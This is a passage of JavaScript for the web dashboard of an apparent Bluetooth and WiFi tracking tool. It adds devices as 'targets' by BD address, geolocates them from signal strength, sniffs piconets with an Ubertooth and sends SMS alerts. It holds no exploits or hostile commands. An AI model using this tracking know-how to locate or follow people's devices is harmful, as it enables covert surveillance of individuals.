    fetch('/api/system_trail/reset', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            addLogEntry('System trail reset - new trail will begin from current position', 'INFO');
        })
        .catch(e => addLogEntry(`Failed to reset trail on server: ${e}`, 'ERROR'));
}

/**
 * Update system trail with new GPS position in real-time
 */
function updateLiveTrail(lon, lat) {
    if (!showSystemTrail) return;

    const newCoord = [lon, lat];

    // Check if this is a significant move (at least 2 meters) to avoid cluttering
    if (liveTrailCoordinates.length > 0) {
        const lastCoord = liveTrailCoordinates[liveTrailCoordinates.length - 1];
        const distance = calculateDistance(lastCoord[1], lastCoord[0], lat, lon);
        if (distance < 2) return;  // Skip if moved less than 2 meters
    }

    // Add new coordinate
    liveTrailCoordinates.push(newCoord);

    // Trim to max points for performance
    if (liveTrailCoordinates.length > MAX_TRAIL_POINTS) {
        liveTrailCoordinates.shift();
    }

    // Update the trail line on map
    if (liveTrailCoordinates.length >= 2) {
        const lineData = {
            type: 'Feature',
            geometry: {
                type: 'LineString',
                coordinates: liveTrailCoordinates
            }
        };

        if (map.getSource('system-trail-line')) {
            // Update existing source
            map.getSource('system-trail-line').setData(lineData);
        } else {
            // Create new source and layers
            map.addSource('system-trail-line', {
                type: 'geojson',
                data: lineData
            });

            // Add glow effect layer
            map.addLayer({
                id: 'system-trail-glow',
                type: 'line',
                source: 'system-trail-line',
                paint: {
                    'line-color': '#00d4ff',
                    'line-width': 6,
                    'line-blur': 4,
                    'line-opacity': 0.3
                }
            });

            // Add main trail line
            map.addLayer({
                id: 'system-trail-layer',
                type: 'line',
                source: 'system-trail-line',
                paint: {
                    'line-color': '#00d4ff',
                    'line-width': 2,
                    'line-opacity': 0.8
                }
            });
        }
    }
}

/**
 * Calculate distance between two coordinates in meters (Haversine)
 */
function calculateDistance(lat1, lon1, lat2, lon2) {
    const R = 6371000; // Earth's radius in meters
    const dLat = (lat2 - lat1) * Math.PI / 180;
    const dLon = (lon2 - lon1) * Math.PI / 180;
    const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
              Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
              Math.sin(dLon/2) * Math.sin(dLon/2);
    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    return R * c;
}

// ==================== 3D TERRAIN & BUILDINGS ====================

let show3dTerrain = false;
let show3dBuildings = false;

function toggle3dTerrain() {
    show3dTerrain = document.getElementById('toggle3dTerrain').checked;

    if (show3dTerrain) {
        // Add terrain source if not present
        if (!map.getSource('mapbox-dem')) {
            map.addSource('mapbox-dem', {
                type: 'raster-dem',
                url: 'mapbox://mapbox.mapbox-terrain-dem-v1',
                tileSize: 512,
                maxzoom: 14
            });
        }
        map.setTerrain({ source: 'mapbox-dem', exaggeration: 1.5 });
        addLogEntry('3D terrain enabled', 'INFO');
    } else {
        map.setTerrain(null);
        addLogEntry('3D terrain disabled', 'INFO');
    }
}

function toggle3dBuildings() {
    show3dBuildings = document.getElementById('toggle3dBuildings').checked;

    if (show3dBuildings) {
        // Add 3D buildings layer if not present
        if (!map.getLayer('3d-buildings')) {
            // Find the first symbol layer for proper layering
            const layers = map.getStyle().layers;
            let labelLayerId;
            for (let i = 0; i < layers.length; i++) {
                if (layers[i].type === 'symbol' && layers[i].layout['text-field']) {
                    labelLayerId = layers[i].id;
                    break;
                }
            }

            map.addLayer({
                id: '3d-buildings',
                source: 'composite',
                'source-layer': 'building',
                filter: ['==', 'extrude', 'true'],
                type: 'fill-extrusion',
                minzoom: 15,
                paint: {
                    'fill-extrusion-color': '#1a2633',
                    'fill-extrusion-height': ['get', 'height'],
                    'fill-extrusion-base': ['get', 'min_height'],
                    'fill-extrusion-opacity': 0.7
                }
            }, labelLayerId);
        } else {
            map.setLayoutProperty('3d-buildings', 'visibility', 'visible');
        }
        addLogEntry('3D buildings enabled', 'INFO');
    } else {
        if (map.getLayer('3d-buildings')) {
            map.setLayoutProperty('3d-buildings', 'visibility', 'none');
        }
        addLogEntry('3D buildings disabled', 'INFO');
    }
}

// ==================== GEO RESET ====================

function resetAllGeo() {
    if (!confirm('Reset all geolocation data? This will clear all RSSI history and emitter estimates.')) return;

    fetch('/api/geo/reset_all', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            addLogEntry(`All geo data reset: ${data.cleared} observations cleared`, 'INFO');
            // Clear all CEP circles
            Object.keys(cepCircles).forEach(bdAddr => {
                const sourceId = `cep-${bdAddr}`;
                if (map.getLayer(sourceId)) map.removeLayer(sourceId);
                if (map.getSource(sourceId)) map.removeSource(sourceId);
            });
            cepCircles = {};
            // Remove device markers with geo
            Object.keys(markers).forEach(bdAddr => {
                markers[bdAddr].remove();
                delete markers[bdAddr];
            });
        })
        .catch(e => addLogEntry(`Failed to reset geo: ${e}`, 'ERROR'));
}

function resetDeviceGeo(bdAddress) {
    fetch(`/api/device/${bdAddress}/geo/reset`, { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            addLogEntry(`Geo reset for ${bdAddress}: ${data.cleared} observations cleared`, 'INFO');
            // Remove marker and CEP
            if (markers[bdAddress]) {
                markers[bdAddress].remove();
                delete markers[bdAddress];
            }
            if (cepCircles[bdAddress]) {
                const sourceId = `cep-${bdAddress}`;
                if (map.getLayer(sourceId)) map.removeLayer(sourceId);
                if (map.getSource(sourceId)) map.removeSource(sourceId);
                delete cepCircles[bdAddress];
            }
        })
        .catch(e => addLogEntry(`Failed to reset geo for ${bdAddress}: ${e}`, 'ERROR'));
}

// ==================== TARGET MANAGEMENT ====================

function loadTargets() {
    fetch('/api/targets')
        .then(response => response.json())
        .then(data => {
            targets = {};
            data.forEach(target => {
                targets[target.bd_address] = target;
            });
            // Update both modal and quick target lists
            refreshModalTargetList();
            updateQuickTargetList();
        });
}

function showTargetContextMenu(event, bdAddress) {
    event.preventDefault();
    contextMenuTarget = bdAddress;

    let menu = document.getElementById('targetContextMenu');
    if (!menu) {
        menu = createTargetContextMenu();
    }

    // Update menu items based on device type
    const device = devices[bdAddress];
    const isBLE = device && device.device_type === 'ble';

    // Update name option based on whether name retrieval is running
    const nameItem = menu.querySelector('[onclick*="name"]');
    if (nameItem) {
        if (nameRetrievalActive[bdAddress]) {
            nameItem.innerHTML = '<i>⏹</i> Stop Get Name';
            nameItem.classList.add('active-op');
        } else {
            nameItem.innerHTML = '<i>📝</i> Get Device Name';
            nameItem.classList.remove('active-op');
        }
    }

    // Update stimulate option for BLE devices
    const stimItem = menu.querySelector('[onclick*="stimulate"]');
    if (stimItem) {
        if (isBLE) {
            stimItem.innerHTML = '<i>📡</i> Stimulate (not for BLE)';
            stimItem.classList.add('disabled');
            stimItem.title = 'Classic BT stimulation not available for BLE devices';
        } else {
            stimItem.innerHTML = '<i>📡</i> Stimulate (BT Classic)';
            stimItem.classList.remove('disabled');
            stimItem.title = '';
        }
    }

    // Update locate option
    const locateItem = menu.querySelector('[onclick*="locate"]');
    if (locateItem) {
        if (isBLE) {
            locateItem.innerHTML = '<i>📍</i> Geolocate (RSSI only)';
            locateItem.title = 'BLE devices use RSSI-based tracking only';
        } else {
            locateItem.innerHTML = '<i>📍</i> Geolocate Device';
            locateItem.title = '';
        }
    }

    // Position the menu with smart repositioning
    positionContextMenu(menu, event.clientX, event.clientY);
}

function createTargetContextMenu() {
    const existing = document.getElementById('targetContextMenu');
    if (existing) existing.remove();

    const menu = document.createElement('div');
    menu.id = 'targetContextMenu';
    menu.className = 'context-menu hidden';
    menu.innerHTML = `
        <div class="context-menu-item" onclick="targetContextAction('info')">
            <i>ℹ</i> Get Device Info
        </div>
        <div class="context-menu-item" onclick="targetContextAction('name')">
            <i>📝</i> Get Device Name
        </div>
        <div class="context-menu-item" onclick="targetContextAction('stimulate')">
            <i>📡</i> Stimulate (BT Classic)
        </div>
        <div class="context-menu-divider"></div>
        <div class="context-menu-item" onclick="targetContextAction('locate')">
            <i>📍</i> Geolocate Device
        </div>
        <div class="context-menu-item" onclick="targetContextAction('georeset')">
            <i>🔄</i> Reset Device Geo
        </div>
        <div class="context-menu-divider"></div>
        <div class="context-menu-item" onclick="targetContextAction('copy')">
            <i>📋</i> Copy BD Address
        </div>
        <div class="context-menu-item" onclick="targetContextAction('zoom')">
            <i>🗺</i> Zoom to Location
        </div>
        <div class="context-menu-divider"></div>
        <div class="context-menu-item target-remove" onclick="targetContextAction('remove')">
            <i>🗑</i> Remove Target
        </div>
    `;
    document.body.appendChild(menu);
    return menu;
}

function targetContextAction(action) {
    if (!contextMenuTarget) return;

    const bdAddress = contextMenuTarget;
    const device = devices[bdAddress];
    const isBLE = device && device.device_type === 'ble';

    switch (action) {
        case 'info':
            getDeviceInfo(bdAddress);
            break;
        case 'name':
            requestDeviceName(bdAddress);
            break;
        case 'stimulate':
            // Block stimulate for BLE devices
            if (isBLE) {
                addLogEntry('Classic BT stimulation is not available for BLE devices', 'WARNING');
            } else {
                stimulateForDevice(bdAddress);
            }
            break;
        case 'locate':
            requestGeolocation(bdAddress);
            break;
        case 'georeset':
            resetDeviceGeo(bdAddress);
            break;
        case 'copy':
            navigator.clipboard.writeText(bdAddress).then(() => {
                addLogEntry(`Copied ${bdAddress} to clipboard`, 'INFO');
            });
            break;
        case 'zoom':
            if (device && device.emitter_lat && device.emitter_lon) {
                map.flyTo({
                    center: [device.emitter_lon, device.emitter_lat],
                    zoom: 18
                });
            } else {
                addLogEntry('No location data for this target', 'WARNING');
            }
            break;
        case 'remove':
            deleteTarget(bdAddress);
            break;
    }

    hideTargetContextMenu();
}

function hideTargetContextMenu() {
    const menu = document.getElementById('targetContextMenu');
    if (menu) menu.classList.add('hidden');
    contextMenuTarget = null;
}

function stimulateForDevice(bdAddress) {
    addLogEntry(`Stimulating to find ${bdAddress}...`, 'INFO');
    fetch('/api/scan/stimulate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: 'classic' })
    })
        .then(r => r.json())
        .then(data => {
            addLogEntry(`Stimulation complete. Found ${data.devices_found || 0} devices.`, 'INFO');
        })
        .catch(e => addLogEntry(`Stimulation failed: ${e}`, 'ERROR'));
}

function addTarget() {
    const bdAddress = document.getElementById('targetBdAddress').value.trim().toUpperCase();
    const alias = document.getElementById('targetAlias').value.trim();

    if (!bdAddress.match(/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/)) {
        addLogEntry('Invalid BD Address format', 'ERROR');
        return;
    }

    fetch('/api/targets', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ bd_address: bdAddress, alias: alias })
    })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'error') {
                addLogEntry('Failed to add target: ' + (data.error || 'Unknown error'), 'ERROR');
                return;
            }
            loadTargets();
            document.getElementById('targetBdAddress').value = '';
            document.getElementById('targetAlias').value = '';
            addLogEntry(`Target added: ${bdAddress}`, 'INFO');
        })
        .catch(error => {
            addLogEntry('Failed to add target: ' + error, 'ERROR');
        });
}

function quickAddTarget(bdAddress) {
    fetch('/api/targets', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ bd_address: bdAddress })
    })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'error') {
                addLogEntry('Failed to add target: ' + (data.error || 'Unknown error'), 'ERROR');
                return;
            }
            loadTargets();
            // Update device in local cache
            if (devices[bdAddress]) {
                devices[bdAddress].is_target = true;
                updateDevice(devices[bdAddress]);
            }
            addLogEntry(`Target added: ${bdAddress}`, 'INFO');
        })
        .catch(error => {
            addLogEntry('Failed to add target: ' + error, 'ERROR');
        });
}

function deleteTarget(bdAddress) {
    fetch(`/api/targets/${encodeURIComponent(bdAddress)}`, { method: 'DELETE' })
        .then(response => response.json())
        .then(data => {
            delete targets[bdAddress];
            refreshModalTargetList();
            updateQuickTargetList();
            updateDeviceTable();
            // Update device in local cache
            if (devices[bdAddress]) {
                devices[bdAddress].is_target = false;
                updateDevice(devices[bdAddress]);
            }
            addLogEntry(`Target removed: ${bdAddress}`, 'INFO');
        })
        .catch(error => {
            addLogEntry('Failed to remove target: ' + error, 'ERROR');
        });
}

// Alias for deleteTarget - used by context menu and target list buttons
function removeTarget(bdAddress) {
    deleteTarget(bdAddress);
}

// ==================== SMS MANAGEMENT ====================

function loadSmsNumbers() {
    fetch('/api/sms/numbers')
        .then(response => response.json())
        .then(data => {
            updateSmsList(data);
            updateSmsListSettings(data);
        });
}

function updateSmsList(numbers) {
    const list = document.getElementById('smsList');
    if (!list) return;
    list.innerHTML = '';

    numbers.forEach(num => {
        const item = document.createElement('div');
        item.className = 'sms-item';
        item.innerHTML = `
            <div class="item-info">
                <span class="item-primary">${num.phone_number}</span>
            </div>
            <button class="item-delete" onclick="deleteSmsNumber(${num.id})">&times;</button>
        `;
        list.appendChild(item);
    });
}

function updateSmsListSettings(numbers) {
    const list = document.getElementById('smsListSettings');
    if (!list) return;
    list.innerHTML = '';

    if (numbers.length === 0) {
        list.innerHTML = '<div class="settings-hint">No SMS numbers configured</div>';
        return;
    }

    numbers.forEach(num => {
        const item = document.createElement('div');
        item.className = 'sms-item';
        item.innerHTML = `
            <div class="item-info">
                <span class="item-primary">${num.phone_number}</span>
            </div>
            <button class="item-delete" onclick="deleteSmsNumber(${num.id})">&times;</button>
        `;
        list.appendChild(item);
    });
}

function addSmsNumber() {
    const input = document.getElementById('smsNumber');
    if (!input) return;
    const phone = input.value.trim();
    if (!phone) return;

    fetch('/api/sms/numbers', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: phone })
    })
        .then(response => response.json())
        .then(data => {
            if (data.error) {
                addLogEntry(data.error, 'ERROR');
            } else {
                loadSmsNumbers();
                input.value = '';
                addLogEntry(`SMS number added: ${phone}`, 'INFO');
            }
        })
        .catch(error => {
            addLogEntry('Failed to add SMS number: ' + error, 'ERROR');
        });
}

function addSmsNumberFromSettings() {
    const input = document.getElementById('settingSmsNumber');
    if (!input) return;
    const phone = input.value.trim();
    if (!phone) return;

    fetch('/api/sms/numbers', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: phone })
    })
        .then(response => response.json())
        .then(data => {
            if (data.error) {
                addLogEntry(data.error, 'ERROR');
            } else {
                loadSmsNumbers();
                input.value = '';
                addLogEntry(`SMS number added: ${phone}`, 'INFO');
            }
        })
        .catch(error => {
            addLogEntry('Failed to add SMS number: ' + error, 'ERROR');
        });
}

function deleteSmsNumber(id) {
    fetch(`/api/sms/numbers/${id}`, { method: 'DELETE' })
        .then(response => response.json())
        .then(data => {
            loadSmsNumbers();
            addLogEntry('SMS number removed', 'INFO');
        })
        .catch(error => {
            addLogEntry('Failed to remove SMS number: ' + error, 'ERROR');
        });
}

// ==================== RADIO MANAGEMENT ====================

function loadRadios() {
    fetch('/api/radios')
        .then(response => response.json())
        .then(data => {
            updateRadioList(data);
            updateRadioListSettings(data);
        });
}

function updateRadioList(radios) {
    const list = document.getElementById('radioList');
    if (!list) return;
    list.innerHTML = '';

    // Bluetooth radios
    radios.bluetooth.forEach(radio => {
        const item = document.createElement('div');
        item.className = `radio-item ${radio.status === 'up' ? '' : 'inactive'}`;
        item.innerHTML = `
            <div class="item-info">
                <span class="item-primary">${radio.interface} (BT)</span>
                <span class="item-secondary">${radio.bd_address}</span>
            </div>
            <button class="action-btn" onclick="toggleRadio('${radio.interface}', 'bluetooth', '${radio.status}')">
                ${radio.status === 'up' ? 'OFF' : 'ON'}
            </button>
        `;
        list.appendChild(item);
    });

    // WiFi radios
    radios.wifi.forEach(radio => {
        const item = document.createElement('div');
        item.className = `radio-item ${radio.status === 'up' ? '' : 'inactive'}`;
        item.innerHTML = `
            <div class="item-info">
                <span class="item-primary">${radio.interface} (WiFi)</span>
                <span class="item-secondary">${radio.mac_address}</span>
            </div>
            <button class="action-btn" onclick="toggleRadio('${radio.interface}', 'wifi', '${radio.status}')">
                ${radio.status === 'up' ? 'OFF' : 'ON'}
            </button>
        `;
        list.appendChild(item);
    });
}

function toggleRadio(iface, type, currentStatus) {
    const action = currentStatus === 'up' ? 'disable' : 'enable';
    fetch(`/api/radios/${iface}/${action}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: type })
    })
        .then(response => response.json())
        .then(data => {
            loadRadios();
            addLogEntry(`Radio ${iface} ${action}d`, 'INFO');
        })
        .catch(error => {
            addLogEntry(`Failed to ${action} radio: ` + error, 'ERROR');
        });
}

function refreshRadios() {
    loadRadios();
    addLogEntry('Radio list refreshed', 'INFO');
}

function updateRadioListSettings(radios) {
    const list = document.getElementById('radioListSettings');
    if (!list) return;
    list.innerHTML = '';

    const ubertoothList = radios.ubertooth || [];
    if (radios.bluetooth.length === 0 && radios.wifi.length === 0 && ubertoothList.length === 0) {
        list.innerHTML = '<div class="settings-hint">No radios detected</div>';
        return;
    }

    // Bluetooth radios
    radios.bluetooth.forEach(radio => {
        const item = document.createElement('div');
        item.className = `radio-item ${radio.status === 'up' ? '' : 'inactive'}`;
        item.innerHTML = `
            <div class="item-info">
                <span class="item-primary">${radio.interface} (Bluetooth)</span>
                <span class="item-secondary">${radio.bd_address}</span>
                <span class="item-status ${radio.status === 'up' ? 'status-up' : 'status-down'}">${radio.status.toUpperCase()}</span>
            </div>
            <button class="btn btn-sm ${radio.status === 'up' ? 'btn-danger' : 'btn-success'}" onclick="toggleRadio('${radio.interface}', 'bluetooth', '${radio.status}')">
                ${radio.status === 'up' ? 'Disable' : 'Enable'}
            </button>
        `;
        list.appendChild(item);
    });

    // WiFi radios
    radios.wifi.forEach(radio => {
        const item = document.createElement('div');
        item.className = `radio-item ${radio.status === 'up' ? '' : 'inactive'}`;
        item.innerHTML = `
            <div class="item-info">
                <span class="item-primary">${radio.interface} (WiFi)</span>
                <span class="item-secondary">${radio.mac_address}</span>
                <span class="item-status ${radio.status === 'up' ? 'status-up' : 'status-down'}">${radio.status.toUpperCase()}</span>
            </div>
            <button class="btn btn-sm ${radio.status === 'up' ? 'btn-danger' : 'btn-success'}" onclick="toggleRadio('${radio.interface}', 'wifi', '${radio.status}')">
                ${radio.status === 'up' ? 'Disable' : 'Enable'}
            </button>
        `;
        list.appendChild(item);
    });

    // Ubertooth devices
    ubertoothList.forEach(radio => {
        const item = document.createElement('div');
        const statusClass = radio.status === 'running' ? 'status-up' : (radio.status === 'ready' ? '' : 'status-down');
        item.className = `radio-item`;
        item.innerHTML = `
            <div class="item-info">
                <span class="item-primary">${radio.interface} (Ubertooth)</span>
                <span class="item-secondary">${radio.version || 'Unknown firmware'}</span>
                <span class="item-status ${statusClass}">${radio.status.toUpperCase()}</span>
            </div>
        `;
        list.appendChild(item);
    });
}

function refreshRadiosInSettings() {
    loadRadios();
    addLogEntry('Radio list refreshed', 'INFO');
}

// ==================== UBERTOOTH FUNCTIONS ====================

let ubertoothRunning = false;

function loadUbertoothStatus() {
    fetch('/api/ubertooth/status')
        .then(response => response.json())
        .then(data => {
            updateUbertoothUI(data);
        })
        .catch(error => {
            console.error('Error loading Ubertooth status:', error);
            const statusText = document.getElementById('ubertoothStatusText');
            if (statusText) {
                statusText.textContent = 'Error checking status';
                statusText.className = 'status-value not-available';
            }
        });
}

function updateUbertoothUI(data) {
    const statusText = document.getElementById('ubertoothStatusText');
    const piconetCount = document.getElementById('ubertoothPiconetCount');
    const startBtn = document.getElementById('ubertoothStartBtn');
    const stopBtn = document.getElementById('ubertoothStopBtn');

    if (statusText) {
        if (!data.available) {
            statusText.textContent = data.error || 'Not Available';
            statusText.className = 'status-value not-available';
        } else if (data.running) {
            statusText.textContent = 'Running';
            statusText.className = 'status-value running';
        } else {
            statusText.textContent = 'Ready';
            statusText.className = 'status-value';
        }
    }

    if (piconetCount) {
        piconetCount.textContent = data.piconets_detected || 0;
    }

    ubertoothRunning = data.running || false;

    if (startBtn) {
        startBtn.disabled = !data.available || data.running;
    }
    if (stopBtn) {
        stopBtn.disabled = !data.running;
    }
}

function startUbertooth() {
    fetch('/api/ubertooth/start', { method: 'POST' })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'started') {
                addLogEntry('Ubertooth scanner started', 'INFO');
                loadUbertoothStatus();
            } else {
                addLogEntry(`Failed to start Ubertooth: ${data.message}`, 'ERROR');
            }
        })
        .catch(error => {
            addLogEntry('Error starting Ubertooth: ' + error, 'ERROR');
        });
}

function stopUbertooth() {
    fetch('/api/ubertooth/stop', { method: 'POST' })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'stopped') {
                addLogEntry('Ubertooth scanner stopped', 'INFO');
                loadUbertoothStatus();
            } else {
                addLogEntry(`Failed to stop Ubertooth: ${data.message}`, 'ERROR');
            }
        })
        .catch(error => {
            addLogEntry('Error stopping Ubertooth: ' + error, 'ERROR');
        });
}

function refreshUbertoothData() {
    fetch('/api/ubertooth/data')
        .then(response => response.json())
        .then(data => {
            updateUbertoothTable(data.piconets || []);
            const piconetCount = document.getElementById('ubertoothPiconetCount');
            if (piconetCount) {
                piconetCount.textContent = data.piconets ? data.piconets.length : 0;
            }
        })
        .catch(error => {
            addLogEntry('Error refreshing Ubertooth data: ' + error, 'ERROR');
        });
}

function updateUbertoothTable(piconets) {
    const tableBody = document.getElementById('ubertoothDataTable');
    if (!tableBody) return;

    tableBody.innerHTML = '';

    if (piconets.length === 0) {
        const row = document.createElement('tr');
        row.innerHTML = '<td colspan="7" style="text-align: center; color: var(--text-secondary);">No piconets detected</td>';
        tableBody.appendChild(row);
        return;
    }

    piconets.forEach(piconet => {
        const row = document.createElement('tr');
        const firstSeen = piconet.first_seen ? new Date(piconet.first_seen).toLocaleTimeString() : '-';
        const lastSeen = piconet.last_seen ? new Date(piconet.last_seen).toLocaleTimeString() : '-';
        const channels = piconet.channels ? piconet.channels.sort((a, b) => a - b).join(', ') : '-';

        row.innerHTML = `
            <td class="lap-cell">${piconet.lap || '-'}</td>
            <td class="uap-cell">${piconet.uap || '??'}</td>
            <td class="bd-partial-cell">${piconet.bd_partial || '-'}</td>
            <td>${channels}</td>
            <td>${piconet.packet_count || 0}</td>
            <td>${firstSeen}</td>
            <td>${lastSeen}</td>
        `;
        tableBody.appendChild(row);
    });
}

function clearUbertoothData() {
    if (!confirm('Clear all captured Ubertooth data?')) return;

    fetch('/api/ubertooth/clear', { method: 'POST' })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'cleared') {
                addLogEntry('Ubertooth data cleared', 'INFO');
                updateUbertoothTable([]);
                const piconetCount = document.getElementById('ubertoothPiconetCount');
                if (piconetCount) piconetCount.textContent = '0';
            }
        })
        .catch(error => {
            addLogEntry('Error clearing Ubertooth data: ' + error, 'ERROR');
        });
}

// ==================== GPS CONFIGURATION ====================

function loadGpsConfig() {
    fetch('/api/gps/config')
        .then(response => response.json())
        .then(config => {
            // Set source dropdown (may not exist on initial page load)
            const gpsSourceEl = document.getElementById('gpsSource');
            if (gpsSourceEl) gpsSourceEl.value = config.source;

            // Set NMEA settings
            const nmeaHostEl = document.getElementById('nmeaHost');
            const nmeaPortEl = document.getElementById('nmeaPort');
            if (nmeaHostEl) nmeaHostEl.value = config.nmea_host;
            if (nmeaPortEl) nmeaPortEl.value = config.nmea_port;

            // Set GPSD settings
            const gpsdHostEl = document.getElementById('gpsdHost');
            const gpsdPortEl = document.getElementById('gpsdPort');
            if (gpsdHostEl) gpsdHostEl.value = config.gpsd_host;
            if (gpsdPortEl) gpsdPortEl.value = config.gpsd_port;

            // Set Serial settings
            const serialPortEl = document.getElementById('serialPort');
            const serialBaudEl = document.getElementById('serialBaud');
            if (serialPortEl) serialPortEl.value = config.serial_port;
            if (serialBaudEl) serialBaudEl.value = config.serial_baud;

            // Show correct settings panel
            if (gpsSourceEl) updateGpsFields();

            // Update GPS status
            updateGpsStatus(config.current_location);
        })
        .catch(error => {
            console.log('GPS config load issue (normal on page load):', error);
        });
}

function updateGpsFields() {
    const source = document.getElementById('gpsSource').value;

    // Hide all settings panels
    document.getElementById('nmeaSettings').classList.add('hidden');
    document.getElementById('gpsdSettings').classList.add('hidden');
    document.getElementById('serialSettings').classList.add('hidden');

    // Show the selected one
    if (source === 'nmea_tcp') {
        document.getElementById('nmeaSettings').classList.remove('hidden');
    } else if (source === 'gpsd') {
        document.getElementById('gpsdSettings').classList.remove('hidden');
    } else if (source === 'serial') {
        document.getElementById('serialSettings').classList.remove('hidden');
    }
}

function saveGpsConfig() {
    const source = document.getElementById('gpsSource').value;

    const config = {
        source: source,
        nmea_host: document.getElementById('nmeaHost').value,
        nmea_port: parseInt(document.getElementById('nmeaPort').value),
        gpsd_host: document.getElementById('gpsdHost').value,
        gpsd_port: parseInt(document.getElementById('gpsdPort').value),
        serial_port: document.getElementById('serialPort').value,
        serial_baud: parseInt(document.getElementById('serialBaud').value)
    };

    fetch('/api/gps/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(config)
    })
        .then(response => response.json())
        .then(data => {
            addLogEntry(`GPS config saved: ${source}`, 'INFO');
        })
        .catch(error => {
            addLogEntry('Failed to save GPS config: ' + error, 'ERROR');
        });
}

function testGpsConnection() {
    const statusEl = document.getElementById('gpsStatus');
    statusEl.textContent = 'TESTING...';
    statusEl.className = 'gps-status';

    addLogEntry('Testing GPS connection...', 'INFO');

    fetch('/api/gps/test', { method: 'POST' })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                statusEl.textContent = 'OK';
                statusEl.className = 'gps-status connected';
                addLogEntry(`GPS test OK: ${data.location.lat.toFixed(6)}, ${data.location.lon.toFixed(6)}`, 'INFO');
            } else {
                statusEl.textContent = 'FAIL';
                statusEl.className = 'gps-status error';
                addLogEntry(`GPS test failed: ${data.error}`, 'WARNING');
            }
        })
        .catch(error => {
            statusEl.textContent = 'ERROR';
            statusEl.className = 'gps-status error';
            addLogEntry('GPS test error: ' + error, 'ERROR');
        });
}

function updateGpsStatus(location) {
    const statusEl = document.getElementById('gpsStatus');

    if (location && location.status === 'ok' && location.lat && location.lat !== 0) {
        statusEl.textContent = 'OK';
        statusEl.className = 'gps-status connected';
    } else if (location && location.status === 'error') {
        statusEl.textContent = 'ERROR';
        statusEl.className = 'gps-status error';
    } else if (location && location.status === 'no_fix') {
        statusEl.textContent = 'NO FIX';
        statusEl.className = 'gps-status warning';
    } else {
        statusEl.textContent = 'NO FIX';
        statusEl.className = 'gps-status warning';
    }
}

// ==================== DEVICE INFO ====================

function getDeviceInfo(bdAddress) {
    addLogEntry(`Querying hcitool info for ${bdAddress}...`, 'INFO');

    // Track in operations bar
    addOperation(`info-${bdAddress}`, 'INFO', 'Device Query', {
        bdAddress,
        cancellable: false
    });

    // Show modal with loading spinner
    const content = document.getElementById('deviceInfoContent');
    content.innerHTML = `
        <div class="loading-container">
            <div class="loading-spinner"></div>
            <div class="loading-text">Running hcitool info ${bdAddress}...</div>
            <div class="loading-subtext">This may take a few seconds</div>
        </div>
    `;
    document.getElementById('deviceInfoModal').classList.remove('hidden');

    socket.emit('request_device_info', { bd_address: bdAddress });
}

function showDeviceInfo(info) {
    // Remove from operations bar
    removeOperation(`info-${info.bd_address}`);

    const content = document.getElementById('deviceInfoContent');
    const device = devices[info.bd_address] || {};

    let html = '<div class="device-info-content">';

    // Show ANALYSIS section first (human-readable summary)
    if (info.analysis && info.analysis.length > 0) {
        html += `<div class="info-section-header">ANALYSIS</div>`;
        html += `<div class="analysis-section">`;
        info.analysis.forEach(item => {
            html += `<div class="analysis-item">${item}</div>`;
        });
        html += `</div>`;
    }

    // Add summary info section
    html += `<div class="info-section-header" style="margin-top: 15px;">DEVICE DETAILS</div>`;

    const currentDeviceType = device.device_type || 'unknown';

    // Build fields with new parsed data - Device Type handled separately with correction UI
    const fields = [
        ['BD Address', info.bd_address],
        ['Device Name', info.device_name || device.device_name || 'Unknown'],
        ['Bluetooth Version', info.bluetooth_version || 'N/A'],
        ['Version Info', info.version_description || 'N/A'],
        ['Device Class', info.parsed?.device_type_class || info.device_class || 'N/A'],
        ['Manufacturer', info.manufacturer_info || device.bt_company || device.manufacturer || 'Unknown'],
        ['Address Type', device.addr_type || 'N/A'],
        ['RSSI', device.rssi ? `${device.rssi} dBm` : 'N/A'],
        ['TX Power', device.tx_power ? `${device.tx_power} dBm` : 'N/A'],
        ['First Seen', formatDateTimeInTimezone(device.first_seen)],
        ['Last Seen', formatDateTimeInTimezone(device.last_seen)],
        ['Emitter Location', device.emitter_lat && device.emitter_lon ?
            `${device.emitter_lat.toFixed(6)}, ${device.emitter_lon.toFixed(6)}` : 'N/A'],
        ['CEP Radius', device.emitter_accuracy ? `${device.emitter_accuracy.toFixed(1)} m` : 'N/A'],
        ['Is Target', device.is_target ? 'YES' : 'NO']
    ];

    fields.forEach(([label, value]) => {
        if (value && value !== 'N/A') {
            html += `
                <div class="info-row">
                    <span class="info-label-modal">${label}:</span>
                    <span class="info-value-modal">${value}</span>
                </div>
            `;
        }
    });

    // Device Type with correction UI
    html += `
        <div class="info-row device-type-row">
            <span class="info-label-modal">Device Type:</span>
            <div class="device-type-selector">
                <select id="deviceTypeSelect" class="device-type-select" data-bd="${info.bd_address}" onchange="correctDeviceType(this)">
                    <option value="classic" ${currentDeviceType === 'classic' ? 'selected' : ''}>Classic</option>
                    <option value="ble" ${currentDeviceType === 'ble' ? 'selected' : ''}>BLE (Low Energy)</option>
                    <option value="unknown" ${currentDeviceType === 'unknown' ? 'selected' : ''}>Unknown</option>
                </select>
                <span class="type-edit-hint">&#9998; click to correct</span>
            </div>
        </div>
    `;

    // Show capabilities summary if available
    if (info.capabilities && Object.keys(info.capabilities).length > 0) {
        html += `<div class="info-section-header" style="margin-top: 15px;">CAPABILITIES</div>`;
        html += `<div class="capabilities-grid">`;
